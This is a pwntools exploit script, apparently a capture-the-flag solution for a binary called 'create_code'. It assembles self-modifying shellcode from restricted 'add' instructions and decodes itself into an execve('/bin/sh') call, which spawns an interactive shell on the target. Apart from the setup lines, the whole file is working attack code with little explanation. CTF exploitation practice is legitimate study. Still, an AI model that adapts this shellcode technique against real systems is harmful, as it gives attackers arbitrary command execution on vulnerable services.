from pwn import*
context(os='linux', arch='amd64')
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
BINARY = './create_code'
elf = ELF(BINARY)
if len(sys.argv) > 1and sys.argv[1] == 'r':
    HOST = "127.0.0.1"
    PORT = 8888
    s = remote(HOST, PORT)
else:
    s = process(BINARY)
#context.terminal = ['tmux', 'splitw', '-h']
#s = gdb.debug(BINARY)
#gdb.attach(s)
s.sendline('1')
print(s.recvuntil("content: "))
flag = b"\x12\xF0\x12\xF0"
buf = asm('''
 add DWORD PTR [rip+0x600], eax
''')
# make xor ecx,ecx   code 0x31c9

buf += asm('''
 add al, 0x0d
 add al, 0x0d
 add al, 0x0d
 add BYTE PTR [rdx+rax*1], al
 add al, 0x01
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
''')
# padding
buf += asm('''
 add cl,  BYTE PTR [rdx]
 add cl,  BYTE PTR [rdx]
 add cl,  BYTE PTR [rdx+rax*1]
''')
buf += b"\x00"*(0x27-len(buf))
buf += b"\x0a\x01"
# rcx = 0x200
buf += asm('''
 add ecx, DWORD PTR [rip+0x30f]
''')
# push rdx   # 0x52
buf += asm('''
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# pop rdi    # 0x5f
buf += asm('''
 add cl, byte PTR [rdx] 
 add al, 6
 add byte PTR [rdx+rcx*1], al
 add al, 1
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x30
# add rdi, 0x30f  # 4881c70f030000
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
''')
# al = 0x40
# xor esi, esi  # 0x31f6
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x30
# xor edx, edx  # 0x31d2
buf += asm('''
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x31
# push 0x3b  # 0x6a3b
buf += asm('''
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x31
# pop rax  # 0x58
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 0xf
 add al, 0x9
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x58
# make /bin/sh
# rcx = 0x200
buf += asm('''
 add ecx, DWORD PTR [rip+0x20f]
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0x5
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add al, 2
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# padding
buf += asm('''
 add cl,  BYTE PTR [rdx]
''')*((0x200-len(buf))//2 - 1)
buf += asm('''
 add cl, byte PTR [rdx+rax*1]
''')
buf += b"\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05"
buf += b"\x00"*(0x2df-len(buf))
buf += b"\x00\x01"# rcx = 0x30f
buf += b"\x00"*(0x30f-len(buf))
buf += b"\x0f\x02\x09\x0e\x0f\x0d\x02"# /bin/sh
buf += b"\x00"*(0x30f+0x2f-len(buf))
buf += b"\x00\x02"# rcx = 0x200
buf += b"\x00"*(1000-len(buf))
'''
0x563fc87904a4    push   rdx
0x563fc87904a5    pop    rdi
0x563fc87904a6    add    rdi, 0x30f
0x563fc87904ad    xor    esi, esi
0x563fc87904af    xor    edx, edx
0x563fc87904b1    push   0x3b
0x563fc87904b3    pop    rax
0x563fc87904b4    syscall  <SYS_execve>
'''
s.sendline(flag+buf)
s.interactive()
